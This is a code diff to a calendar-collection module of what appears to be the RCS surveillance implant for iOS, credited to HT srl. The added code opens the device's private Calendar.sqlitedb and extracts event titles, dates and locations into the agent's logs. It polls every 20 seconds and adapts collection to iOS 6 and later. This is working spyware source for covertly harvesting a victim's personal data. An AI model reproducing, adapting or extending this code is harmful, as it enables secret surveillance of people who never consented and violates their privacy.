@@ -5,6 +5,7 @@
 //  Created by kiodo on 04/08/11.
 //  Copyright 2011 HT srl. All rights reserved.
 //
+#import <sqlite3.h>
 
 #import "RCSIAgentCalendar.h"
 #import "RCSICommon.h"
@@ -314,7 +315,7 @@ NSString *k_i_AgentCalendarRunLoopMode = @"k_i_AgentCalendarRunLoopMode";
     {
       [logManager closeActiveLog: LOG_CALENDAR withLogID: 0];
 
-      if ([[anEvent lastModifiedDate] timeIntervalSince1970] > mLastEvent)
+      if (gOSMajor < 6 && [[anEvent lastModifiedDate] timeIntervalSince1970] > mLastEvent)
         {
           mLastEvent = [[anEvent lastModifiedDate] timeIntervalSince1970];
           [self _setAgentMessagesProperty];
@@ -375,28 +376,108 @@ NSString *k_i_AgentCalendarRunLoopMode = @"k_i_AgentCalendarRunLoopMode";
     }
 }
 
+- (void)runParseCalEvents
+{
+  long          rowid;
+  long          startdate, enddate;
+  char          sql_query_curr[1024];
+  int           ret, nrow = 0, ncol = 0;
+  char          *szErr;
+  char          **result;
+  sqlite3       *db;
+  
+  char          sql_query_all[] = "select calendaritem.rowid, calendaritem.summary, calendaritem.start_date , calendaritem.end_date, location.title from calendaritem inner join location on calendaritem.location_id = location.rowid";
+      
+  sprintf(sql_query_curr, "%s where calendaritem.ROWID > %f", sql_query_all, mLastEvent);
+  
+  if (sqlite3_open("/var/mobile/Library/Calendar/Calendar.sqlitedb", &db))
+  {
+    sqlite3_close(db);
+    return;
+  }
+  // running the query
+  ret = sqlite3_get_table(db, sql_query_curr, &result, &nrow, &ncol, &szErr);
+  
+  // Close as soon as possible
+  sqlite3_close(db);
+  
+  if (ret != SQLITE_OK)
+    return;
+  
+  // Only if we got some msg...
+  if (ncol * nrow > 0)
+  {
+    for (int i = 0; i< nrow * ncol; i += 5)
+    {
+      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
+      
+      sscanf(result[ncol + i], "%ld", (long*)&rowid);
+      
+      NSString *summary = [NSString stringWithUTF8String: result[ncol + i + 1]];
+      
+      startdate = 0;
+      enddate   = 0;
+      
+      sscanf(result[ncol + i + 2], "%ld", (long*)&startdate);
+      
+      sscanf(result[ncol + i + 3], "%ld", (long*)&enddate);
+      
+      NSDate *start = [NSDate dateWithTimeIntervalSince1970:(startdate+NSTimeIntervalSince1970)];
+      NSDate *end   = [NSDate dateWithTimeIntervalSince1970:(enddate+NSTimeIntervalSince1970)];
+      
+      NSString *location = [NSString stringWithUTF8String: result[ncol + i + 4]];
+      
+      EKEvent *event = [EKEvent eventWithEventStore:nil];
+      
+      [event setTitle:summary];
+      [event setNotes:summary];
+      [event setStartDate:start];
+      [event setEndDate:end];
+      [event setLocation:location];
+
+      [self writeCalLog: event];
+      
+      mLastEvent = rowid;
+      
+      [self _setAgentMessagesProperty];
+      
+      [innerPool release];
+    }
+    
+    // free result table
+    sqlite3_free_table(result);
+  }
+}
+
 - (void)parseCalEvents:(NSTimer*)theTimer
 {
   NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];
   
-  NSDictionary *eventDict = (NSDictionary*)[theTimer userInfo];
+  if (gOSMajor >= 6)
+  {
+    [self runParseCalEvents];
+  }
+  else
+  {
+    NSDictionary *eventDict = (NSDictionary*)[theTimer userInfo];
+      
+    BOOL allEvents    = [[eventDict objectForKey:@"allevents"] boolValue];
+    NSDate *startDate = [eventDict objectForKey: @"startDate"];
+    NSDate *endDate   = [eventDict objectForKey: @"endDate"];
     
-  BOOL allEvents    = [[eventDict objectForKey:@"allevents"] boolValue];
-  NSDate *startDate = [eventDict objectForKey: @"startDate"];
-  NSDate *endDate   = [eventDict objectForKey: @"endDate"];
+    [self runParseCalEvents: allEvents withStartDate: startDate andEndDate: endDate];
+  }
   
-  [self runParseCalEvents: allEvents withStartDate: startDate andEndDate: endDate];
-
   [pool release];
 }
 
-- (void)setCalPollingTimeOut:(NSTimeInterval)aTimeOut 
+- (void)setCalPollingTimeOut:(NSTimeInterval)aTimeOut
               withDictionary:(NSDictionary*)theDict
-{  
-  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut 
-                                                    target: self 
-                                                  selector: @selector(parseCalEvents:) 
-                                                  userInfo: theDict 
+{
+  NSTimer *timer = [NSTimer scheduledTimerWithTimeInterval: aTimeOut
+                                                    target: self
+                                                  selector: @selector(parseCalEvents:)
+                                                  userInfo: theDict
                                                    repeats: YES];
   
   [[NSRunLoop currentRunLoop] addTimer: timer forMode: k_i_AgentCalendarRunLoopMode];
@@ -406,6 +487,10 @@ NSString *k_i_AgentCalendarRunLoopMode = @"k_i_AgentCalendarRunLoopMode";
 {
   NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];
   
+  NSDate *startDate = nil;
+  NSDate *endDate = nil;
+  NSDictionary *allEventDict = nil;
+  
   if ([self isThreadCancelled] == TRUE)
     {
       [self setMAgentStatus: AGENT_STATUS_STOPPED];
@@ -413,29 +498,39 @@ NSString *k_i_AgentCalendarRunLoopMode = @"k_i_AgentCalendarRunLoopMode";
       return;
     }
   
-  NSDate *startDate = [self initStartDate];
-  NSDate *endDate   = [self initEndDate];
-  
   [self _getAgentMessagesProperty];
-
-  if (mLastEvent == 0) 
-    {
-      mLastEvent = [[NSDate dateWithTimeIntervalSince1970:0] timeIntervalSince1970];
-      [self runParseCalEvents: YES withStartDate:startDate andEndDate:endDate];
-    }
   
-  NSNumber *noNum   = [NSNumber numberWithBool: NO];
-  
-  NSDictionary *allEventDict = 
-      [[NSDictionary alloc] initWithObjectsAndKeys:noNum, 
-                                                   @"allevents",
-                                                   startDate, 
-                                                   @"startDate",
-                                                   endDate, 
-                                                   @"endDate", 
-                                                   nil];
-  
-  [self setCalPollingTimeOut: 20.0 withDictionary: allEventDict];
+  if (gOSMajor >= 6)
+  {
+    if (mLastEvent == 0)
+      [self runParseCalEvents];
+    
+    [self setCalPollingTimeOut: 20.0 withDictionary: nil];
+  }
+  else
+  {
+    startDate = [self initStartDate];
+    endDate   = [self initEndDate];
+ 
+    if (mLastEvent == 0) 
+      {
+        mLastEvent = [[NSDate dateWithTimeIntervalSince1970:0] timeIntervalSince1970];
+        [self runParseCalEvents: YES withStartDate:startDate andEndDate:endDate];
+      }
+    
+    NSNumber *noNum   = [NSNumber numberWithBool: NO];
+    
+    allEventDict = 
+        [[NSDictionary alloc] initWithObjectsAndKeys:noNum, 
+                                                     @"allevents",
+                                                     startDate, 
+                                                     @"startDate",
+                                                     endDate, 
+                                                     @"endDate", 
+                                                     nil];
+    
+    [self setCalPollingTimeOut: 20.0 withDictionary: allEventDict];
+  }
   
   while([self mAgentStatus] == AGENT_STATUS_RUNNING)
     {
